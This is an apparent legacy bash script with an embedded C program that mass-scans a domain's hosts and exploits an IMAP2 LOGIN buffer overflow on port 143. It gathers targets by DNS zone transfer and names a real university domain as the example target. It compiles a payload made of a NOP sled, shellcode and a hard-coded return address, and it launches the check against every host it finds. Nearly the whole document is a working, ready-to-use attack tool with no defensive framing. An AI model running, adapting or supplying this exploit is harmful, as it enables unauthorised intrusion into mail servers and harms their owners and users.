
#!/bin/bash
# tnt on EFNET
# d0x@usa.net
# ne komy ne davai
# This script will scan (and exploit) an entire subnet for imap2 vulnerabilitles.
# scan subnet for 143 open and werk
# chmod +x 143.sh
# 143.sh mit.edu

if [ $# != 1 ]
then
  echo "Usage:"
  echo `basename $0`" <domain>"
  exit
else

if [ -f check ]; then
echo "* Port scaner already exist"
else
echo "* Compiling 143 port scaner."
cat > check.c <<'EOF'
#include <stdio.h>
#include <netdb.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

char *h_to_ip(char *hostname);
char *h_to_ip(char *hostname) {
  struct hostent *h;
  struct sockaddr_in tmp;
  struct in_addr in;
  h = gethostbyname(hostname);
  if (h==NULL) exit(-1);
  memcpy((caddr_t)&tmp.sin_addr.s_addr, h->h_addr, h->h_length);
  memcpy(&in,&tmp.sin_addr.s_addr,4);
  return(inet_ntoa(in));
}

  void call_alarm(void) { signal(SIGALRM, call_alarm); }

  main(int argc, char *argv[]) {
  struct sockaddr_in sin;
  char *hostname;
  char shell[] =
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\xeb\x3b\x5e\x89\x76\x08\x31\xed\x31\xc9\x31\xc0\x88"
  "\x6e\x07\x89\x6e\x0c\xb0\x0b\x89\xf3\x8d\x6e\x08\x89\xe9\x8d\x6e"
  "\x0c\x89\xea\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\xe8\xc0\xff\xff\xff/bin/df";
  char username[1024+255];
   long val;
   char buffer[512];
  int outsocket,tnt,i;
  if (argc<2) { printf("Usage : %s hostname\n",argv[0]);exit(-1); }
  hostname=argv[1];
  outsocket=socket(AF_INET,SOCK_STREAM,0);
  sin.sin_family=AF_INET;
  sin.sin_port=htons(143);
  signal(SIGALRM, call_alarm);
  alarm(5);
  sin.sin_addr.s_addr=inet_addr(h_to_ip(hostname));
  strcpy(username,shell);
  for(i=strlen(username);i<sizeof(username);i++)
  username[i]=0x90;
  val = 0xbffff501 + 0; /* 0 is offset (-1000 .. 1000) */

  for(i=1024;i<strlen(username)-4;i+=4) {
  username[i+0] = val & 0x000000ff;
  username[i+1] = (val & 0x0000ff00) >> 8;
  username[i+2] = (val & 0x00ff0000) >> 16;
  username[i+3] = (val & 0xff000000) >> 24;
}
username[ sizeof(username)-1 ] = 0;
tnt=connect (outsocket, (struct sockaddr *) &sin, sizeof(sin));
alarm(0);
if (tnt > -1 ) {
write(outsocket,"301 LOGIN \"",strlen("301 LOGIN \""));
write(outsocket,username,strlen(username));
write(outsocket,"\" pass\n\n",strlen(" pass\n\n"));
while (read(outsocket,buffer,512)!=0) {if ((strstr(buffer,"Bad")!=NULL) ||
(strstr(buffer,"BAD")!=NULL) || (strstr(buffer,"Netscape")!=NULL) ||
(strstr(buffer,"v10.")!=NULL) || (strstr(buffer,"AltaVista")!=NULL) ||
(strstr(buffer,"Solstice")!=NULL) || (s
trstr(buffer,"RPC:")!=NULL)) {close(outsocket);exit(-1);}}
if (strstr(buffer,"Filesystem")!=NULL) { printf("%s\n",argv[1]); }
}
close(outsocket);
}
EOF
gcc -o check check.c >/dev/null 2>&1
if [ -f check ]; then
  /bin/rm -rf check.c
else
  echo "* Unable to compile port scaner"
  rm -rf *.tmp
  rm -rf *.domains
  rm -rf check.c
  exit 1
fi
fi
echo "* Scanning domain for hosts."
host -l $1 | grep "has address" | awk -F ' ' '{ print $4 }' > $1.domains
echo "* Host scan complete."
echo "* Sorting hosts and removing dupes."
sort < $1.domains > $1.sorted
uniq < $1.sorted > $1.domains
rm -f $1.sorted
cat $1.domains | awk -F ' ' '{ print "./check " $1 " &" }' > $1.tmp
chmod +x $1.tmp
echo "* Scaning for port 143 open. Saving data to $1.hits"
./$1.tmp > $1.hits

rm -rf *.tmp
rm -rf *.domains
sleep 5
killall -9 check
fi

